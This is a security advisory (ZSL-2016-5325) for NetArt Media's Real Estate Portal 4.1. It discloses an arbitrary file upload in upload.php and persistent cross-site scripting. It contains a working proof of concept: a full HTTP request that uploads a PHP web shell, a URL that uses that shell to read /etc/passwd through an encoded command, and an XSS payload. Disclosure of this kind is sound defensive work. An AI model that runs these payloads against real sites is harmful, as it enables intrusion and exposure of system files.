@@ -1,0 +1,86 @@
+Real Estate Portal v4.1 Remote Code Execution Vulnerability
+
+
+Vendor: NetArt Media
+Product web page: http://www.netartmedia.net
+Affected version: 4.1
+
+Summary: Real Estate Portal is a software written in PHP,
+allowing you to launch powerful and professional looking
+real estate portals with rich functionalities for the private
+sellers, buyers and real estate agents to list properties
+for sale or rent, search in the database, show featured
+ads and many others. The private sellers can manage their
+ads at any time through their personal administration space.
+
+Desc: Real Estate Portal suffers from an arbitrary file upload
+vulnerability leading to an arbitrary PHP code execution. The
+vulnerability is caused due to the improper verification of
+uploaded files in '/upload.php' script thru the 'myfile' POST
+parameter. This can be exploited to execute arbitrary PHP code
+by uploading a malicious PHP script file with '.php' extension
+that will be stored in the '/uploads' directory. 
+
+Tested on: nginx/1.10.0
+           PHP/5.2.17
+           MySQL/5.1.66
+
+
+Vulnerability discovered by Bikramaditya Guha aka "PhoenixX"
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5325
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5325.php
+
+
+06.05.2016
+
+---
+
+
+1. Arbitrary File Upload:
+-------------------------
+
+Parameter: myfile (POST)
+POC URL: http://localhost/uploads/Test.php?cmd=cat%20$%28echo%20L2V0Yy9wYXNzd2Q=%20|%20base64%20-d%29
+
+POST /upload.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://localhost/USERS/index.php
+Content-Length: 419
+Content-Type: multipart/form-data; boundary=---------------------------8914507815764
+Cookie: PHPSESSID=7k4au5p4m0skscj4gjbfedfjs5; AuthU=demo%7Efe01ce2a7fbac8fafaed7c982a04e229%7E1462616214
+Connection: close
+
+-----------------------------8914507815764
+Content-Disposition: form-data; name="myfile"; filename="Test.php"
+Content-Type: image/jpeg
+
+<?php
+system($_GET['cmd']); 
+?>
+
+-----------------------------8914507815764
+Content-Disposition: form-data; name=""
+
+undefined
+-----------------------------8914507815764
+Content-Disposition: form-data; name=""
+
+undefined
+-----------------------------8914507815764--
+
+
+
+2. Persistent Cross Site Scripting:
+-----------------------------------
+
+http://localhost/USERS/index.php
+Parameters: title, html, headline, size, youtube_id, address, latitude, longitude, user_first_name, user_last_name, agency, user_phone, user_email, website (POST)
+Payload: " onmousemove=alert(1) 
